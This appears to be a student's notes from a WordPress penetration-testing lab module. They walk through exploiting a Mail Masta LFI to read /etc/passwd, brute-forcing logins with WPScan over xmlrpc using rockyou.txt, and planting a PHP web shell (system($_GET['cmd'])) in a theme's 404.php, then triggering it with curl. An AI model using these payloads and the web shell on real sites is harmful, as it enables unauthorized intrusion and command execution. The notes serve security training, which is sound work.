# Exploiting a Vulnerable Plugin
## Leveraging WPScan Results (Example Scenario)
After running a scan, the report generated by WPScan tells us that the website uses an older version of WordPress (5.3.2) and an outdated theme called `Twenty Twenty`. WPScan identified two vulnerable plugins, `Mail Masta 1.0` and `Google Review Slider`. 

This version of the `Mail Masta` plugin is known to be vulnerable to SQL Injection as well as Local File Inclusion (LFI). The report output also contains URLs to PoCs, which provide information on how to exploit these vulnerabilities.

Let's verify if the LFI can be exploited based on this exploit-db [report](https://www.exploit-db.com/exploits/40290/). The exploit states that any unauthenticated user can read local files through the path: `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`.
# Attacking WordPress Users
## WordPress User Bruteforce
WPScan can be used to brute force usernames and passwords.
### Example Scenario
The scan report returned three users registered on the website: `admin`, `roger`, and `david`. 

The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. 

The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. 
> The `xmlrpc` method is preferred as it is faster.
#### WPscan - XMLRPC
```bash
wpscan --password-attack xmlrpc -t 20 -U admin, david -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.com
```
# Remote Code Execution (RCE) via the Theme Editor
## Attacking the WordPress Backend
With administrative access to WordPress, we can modify the PHP source code to execute system commands. 

To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. 

Click on `Appearance` on the side panel and select `Theme Editor`. 
- This page will allow us to edit the PHP source code directly. 
- We should select an inactive theme in order to avoid corrupting the main theme.
### Theme Editor
![WordPress theme editor showing Transportex stylesheet with theme details and code.](https://academy.hackthebox.com/storage/modules/17/Theme-Editor.png)

We can see that the active theme is `Transportex` so an unused theme such as `Twenty Seventeen` should be chosen instead.
### Selecting Theme
![WordPress theme editor showing Twenty Seventeen stylesheet with theme details and code.](https://academy.hackthebox.com/storage/modules/17/Twenty-Seventeen.png)

Choose a theme and click on `Select`. Next, choose a non-critical file such as `404.php` to modify and add a web shell.
### Twenty Seventeen Theme - 404.php
```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
...
```
- The above code should allow us to execute commands via the GET parameter `cmd`

In this example, we modified the source code of the `404.php` page and added a new function called `system()`. This function will allow us to directly execute operating system commands by sending a GET request and appending the `cmd` parameter to the end of the URL after a question mark `?` and specifying an operating system command. The modified URL should look like this `404.php?cmd=id`.

We can validate that we have achieved RCE by entering the URL into the web browser or issuing the `cURL` request below.
```bash
curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
- Use `-s` instead of `-X GET` if `-X` doesnt work
- Or visit the URL